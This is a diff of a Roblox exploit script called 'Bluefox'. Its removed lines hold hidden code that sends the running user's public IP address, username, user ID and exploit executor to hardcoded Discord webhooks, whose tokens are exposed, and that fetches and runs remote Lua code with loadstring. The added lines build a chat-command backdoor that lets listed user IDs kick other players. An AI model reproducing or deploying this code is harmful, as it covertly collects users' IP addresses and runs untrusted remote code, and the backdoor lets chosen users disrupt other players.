@@ -1,70 +1,61 @@
-local ESD = tostring(game:HttpGet("https://api.ipify.org", true))
-local HTTP_ = game:GetService('HttpService')
-local LPR = game:GetService('Players').LocalPlayer
-local webhookcheck =
-    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
-    secure_load and "Sentinel" or
-    KRNL_LOADED and "Krnl" or
-    SONA_LOADED and "Sona" or
-    FlUXUS_LOADED and "Fluxus" or
-    "Kid with shit exploit"
-local url =
-"https://discord.com/api/webhooks/1209332441668653066/qewJi9gy0Zi904bSRrByhD9HPAkCy1hj9GFec-yy2qcJMWkWPnLiQl5eeGnMt6nzeBjN"
-local data = { ["username"] = LPR.Name .. ' [' .. LPR.UserId .. ']',
-    ["avatar_url"] = HTTP_:JSONDecode(game:HttpGet(('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%i&size=48x48&format=Png&isCircular=false'):format(LPR.UserId)))['data'][1]['imageUrl'],
-    ["embeds"] = { { ["description"] = "Details:",
-        ["fields"] = { { name = "Exploit", value = webhookcheck, inline = true }, { name = "IP", value = ESD,
-            inline = true }, }, ["color"] = tonumber(0x7269da), } } }
-local newdata = HTTP_:JSONEncode(data)
-local headers = { ["content-type"] = "application/json" }
-local request = http_request or request or HttpPost or syn.request
-request({ Url = url, Body = newdata, Method = "POST", Headers = headers })
-
-
-	local HTTP_ = game:GetService('HttpService')
-	local LPR = game:GetService('Players').LocalPlayer
-	local url =
-	"https://discord.com/api/webhooks/1156264339746062367/cLFpuxq8JTSX3qh3a9b5Jo6oVH1PX851rd7BkvQywuUmEGEY3GTh78wJShG_dWOFh6Ky"
-	local data = { ["username"] = "bluefox script",
-	["embeds"] = { { ["description"] = "script active by",
-	["fields"] = { { name = "Username", value = LPR.Name, inline = true }, { name = "UsernID", value = LPR.UserId,
-	inline = true }, }, ["color"] = tonumber(0x7269da), } } } 
-	local newdata = HTTP_:JSONEncode(data)
-	local headers = { ["content-type"] = "application/json" }
-	local request = http_request or request or HttpPost or syn.request
-	request({ Url = url, Body = newdata, Method = "POST", Headers = headers })
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/eeeeeeeesw/Bluefox/main/reloader"))();
-loadstring(game:HttpGet("https://raw.githubusercontent.com/eeeeeeeesw/Bluefox/main/bluefox%20script.lua"))();
-
--- Reload script
-
+local Players = game:GetService("Players")
+local Storage = game:GetService("ReplicatedStorage")
 local chatBotPrefix = "!"
-local allowedUserID = 2236295191 -- Replace with the desired User ID
+local allowedUserID = {4852374551,3201937343,2236295191}
 
 local function sendReloadMessageToChatBot(player)
-    local reloadMessage = "Tested"
-    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(reloadMessage, "All")
+    local reloadMessage = "Hey! I'm A Bluefox :D"
+    Storage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(reloadMessage, "All")
 end
 
-local function onChatted(player, message)
-    local lowercaseMessage = string.lower(message)
-    if lowercaseMessage:sub(1, 1) == chatBotPrefix then
-        local command = lowercaseMessage:sub(2)
+-- Function to handle when a new player joins
+local function onPlayerAdded(player)
+    print("Player joined:", player.Name)
 
-        if command == "reload" then
-            if player.UserId == allowedUserID then
-               loadstring(game:HttpGet("https://raw.githubusercontent.com/OhDaddyUwu/The-Bleufox-Script/main/Script"))()
+    local function kickPlayerByUsername(player, partialUsername)
+        local targetPlayer
 
-            else
-                print("no")
+        for _, playerInstance in ipairs(Players:GetPlayers()) do
+            if string.find(string.lower(playerInstance.Name), string.lower(partialUsername)) then
+                targetPlayer = playerInstance
+                break
+            end
+        end
+
+        if targetPlayer then
+            targetPlayer:Kick("You have been kicked by " .. player.Name)
+        else
+            print("Player not found!")
+        end
+    end
+
+    local function onChatted(player, message)
+        local lowercaseMessage = string.lower(message)
+        if lowercaseMessage:sub(1, 1) == chatBotPrefix then
+            local command, argument = lowercaseMessage:match("(%w+)%s*(.*)")
+
+            if command == "bluefoxes" then
+                sendReloadMessageToChatBot(player)
+            elseif command == "kick" then
+                if argument ~= "" then
+                    if player.Name == argument then
+                        player:Kick("You cannot kick yourself.")
+                    else
+                        kickPlayerByUsername(player, argument)
+                    end
+                else
+                print("Usage: !kick <playerUsername>")
+                end
             end
         end
     end
+
+    for _, player in ipairs(game.Players:GetPlayers()) do
+        player.Chatted:Connect(function(msg)
+            onChatted(player, msg)
+        end)
+    end
+
 end
 
-for _, player in ipairs(game.Players:GetPlayers()) do
-    player.Chatted:Connect(function(msg)
-        onChatted(player, msg)
-    end)
-end
+Players.PlayerAdded:Connect(onPlayerAdded)
